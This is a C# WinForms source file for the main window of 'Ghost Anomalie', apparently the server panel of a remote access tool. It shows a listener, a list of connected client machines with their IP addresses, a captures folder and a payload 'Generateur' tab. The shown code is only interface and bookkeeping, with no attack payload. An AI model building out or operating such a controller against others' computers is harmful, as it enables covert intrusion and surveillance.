using GhostAnomalie.Common.Utils;
using GhostAnomalie.Server.Controls;
using GhostAnomalie.Server.Network;
using GhostAnomalie.Server.Utils;

namespace GhostAnomalie.Server.Forms
{
    public partial class MainForm : Form
    {
        private Listener _listener;
        private Dictionary<string, ClientHandler> _clients = new();
        private ClientHandler? _selectedClient;

        // === ONGLETS ===
        private TabControl _tabControl;
        private ServerTab _serverTab;
        private BuilderTab _builderTab;
        private SettingsTab _settingsTab;

        // === STATUS ===
        private Label _lblStatus;
        private ToolStripStatusLabel _lblStatusBar;
        private ToolStripStatusLabel _lblClientsStatus;

        public MainForm()
        {
            InitializeComponent();
            _listener = new Listener(this);
            this.Text = $"Ghost Anomalie v{Constants.Version}";

            // Créer les dossiers
            Directory.CreateDirectory(Constants.ClientsFolder);
            Directory.CreateDirectory(Constants.LogsFolder);
            Directory.CreateDirectory(Constants.CapturesFolder);

            // Charger la configuration
            ConfigManager.Load();

            // Initialiser les onglets
            _serverTab.Initialize(this);
            _builderTab.Initialize(this);
            _settingsTab.Initialize(this);

            Log($"Ghost Anomalie v{Constants.Version} demarre");
            Log(Constants.Author);
            Log("Pret a recevoir des connexions");
        }

        private void InitializeComponent()
        {
            this.Size = new Size(1200, 800);
            this.MinimumSize = new Size(1000, 600);
            this.BackColor = Color.FromArgb(5, 5, 15);
            this.ForeColor = Color.FromArgb(0, 255, 136);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormClosing += MainForm_FormClosing;
            this.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);

            // ===== HEADER =====
            var header = new Panel
            {
                Dock = DockStyle.Top,
                Height = 70,
                BackColor = Color.FromArgb(10, 10, 26),
                ForeColor = Color.FromArgb(0, 255, 136)
            };

            var title = new Label
            {
                Text = "GHOST ANOMALIE",
                Font = new Font("Arial Black", 22, FontStyle.Bold),
                ForeColor = Color.FromArgb(0, 255, 136),
                BackColor = Color.Transparent,
                Location = new Point(20, 12),
                AutoSize = true
            };

            var version = new Label
            {
                Text = $"v{Constants.Version}",
                Font = new Font("Arial", 10),
                ForeColor = Color.FromArgb(100, 100, 100),
                BackColor = Color.Transparent,
                Location = new Point(20, 45),
                AutoSize = true
            };

            var author = new Label
            {
                Text = Constants.Author,
                Font = new Font("Arial", 9),
                ForeColor = Color.FromArgb(80, 80, 80),
                BackColor = Color.Transparent,
                Location = new Point(120, 45),
                AutoSize = true
            };

            _lblStatus = new Label
            {
                Text = "OFFLINE",
                Font = new Font("Arial", 12, FontStyle.Bold),
                ForeColor = Color.FromArgb(255, 50, 50),
                BackColor = Color.Transparent,
                Location = new Point(header.Width - 180, 22),
                AutoSize = true,
                Anchor = AnchorStyles.Top | AnchorStyles.Right
            };

            header.Controls.Add(title);
            header.Controls.Add(version);
            header.Controls.Add(author);
            header.Controls.Add(_lblStatus);
            this.Controls.Add(header);

            // ===== TAB CONTROL =====
            _tabControl = new TabControl
            {
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(5, 5, 15),
                ForeColor = Color.FromArgb(0, 255, 136),
                Font = new Font("Segoe UI", 10, FontStyle.Bold)
            };

            // ===== ONGLET SERVEUR =====
            var serverPage = new TabPage("Serveur");
            serverPage.BackColor = Color.FromArgb(5, 5, 15);
            _serverTab = new ServerTab();
            _serverTab.Dock = DockStyle.Fill;
            serverPage.Controls.Add(_serverTab);

            // ===== ONGLET GENERATEUR =====
            var builderPage = new TabPage("Generateur");
            builderPage.BackColor = Color.FromArgb(5, 5, 15);
            _builderTab = new BuilderTab();
            _builderTab.Dock = DockStyle.Fill;
            builderPage.Controls.Add(_builderTab);

            // ===== ONGLET PARAMETRES =====
            var settingsPage = new TabPage("Parametres");
            settingsPage.BackColor = Color.FromArgb(5, 5, 15);
            _settingsTab = new SettingsTab();
            _settingsTab.Dock = DockStyle.Fill;
            settingsPage.Controls.Add(_settingsTab);

            _tabControl.TabPages.Add(serverPage);
            _tabControl.TabPages.Add(builderPage);
            _tabControl.TabPages.Add(settingsPage);
            this.Controls.Add(_tabControl);

            // ===== STATUS BAR =====
            var statusBar = new StatusStrip
            {
                BackColor = Color.FromArgb(10, 10, 26),
                ForeColor = Color.FromArgb(100, 100, 100)
            };

            _lblStatusBar = new ToolStripStatusLabel("Pret - Ghost Anomalie");
            statusBar.Items.Add(_lblStatusBar);

            _lblClientsStatus = new ToolStripStatusLabel("Clients: 0");
            statusBar.Items.Add(_lblClientsStatus);

            this.Controls.Add(statusBar);
        }

        // ============================================================
        // METHODES PUBLIQUES
        // ============================================================

        public void Log(string message)
        {
            if (_serverTab != null)
            {
                _serverTab.Log(message);
            }

            if (_lblStatusBar != null)
            {
                _lblStatusBar.Text = message.Length > 60 ? message.Substring(0, 57) + "..." : message;
            }

            Logger.Info(message);
        }

        public void SetStatus(string message, bool isOnline)
        {
            if (_lblStatus != null)
            {
                _lblStatus.Text = isOnline ? "ONLINE" : "OFFLINE";
                _lblStatus.ForeColor = isOnline ? Color.FromArgb(0, 255, 136) : Color.FromArgb(255, 50, 50);
            }

            if (_lblStatusBar != null)
            {
                _lblStatusBar.Text = message;
            }
        }

        public void UpdateClientsCount(int count)
        {
            if (_lblClientsStatus != null)
            {
                _lblClientsStatus.Text = $"Clients: {count}";
            }

            if (_serverTab != null)
            {
                _serverTab.UpdateClientsCount(count);
            }
        }

        public void AddClient(ClientHandler client)
        {
            lock (_clients)
            {
                _clients[client.ClientId] = client;
                _serverTab.AddClient(client);
                UpdateClientsCount(_clients.Count);
                Log($"Client connecte: {client.ClientId} ({client.IpAddress})");
            }
        }

        public void RemoveClient(string clientId)
        {
            lock (_clients)
            {
                if (_clients.ContainsKey(clientId))
                {
                    _clients.Remove(clientId);
                    _serverTab.RemoveClient(clientId);
                    UpdateClientsCount(_clients.Count);
                    Log($"Client deconnecte: {clientId}");
                }
            }
        }

        public ClientHandler GetClient(string clientId)
        {
            lock (_clients)
            {
                return _clients.ContainsKey(clientId) ? _clients[clientId] : null;
            }
        }

        public Dictionary<string, ClientHandler> GetClients()
        {
            lock (_clients)
            {
                return new Dictionary<string, ClientHandler>(_clients);
            }
        }

        public ClientHandler GetSelectedClient()
        {
            return _serverTab.GetSelectedClient();
        }

        public Listener GetListener()
        {
            return _listener;
        }

        // ============================================================
        // EVENEMENTS
        // ============================================================

        private void MainForm_FormClosing(object? sender, FormClosingEventArgs e)
        {
            _listener.Stop();
            Logger.Info("Application fermee");
        }
    }
}
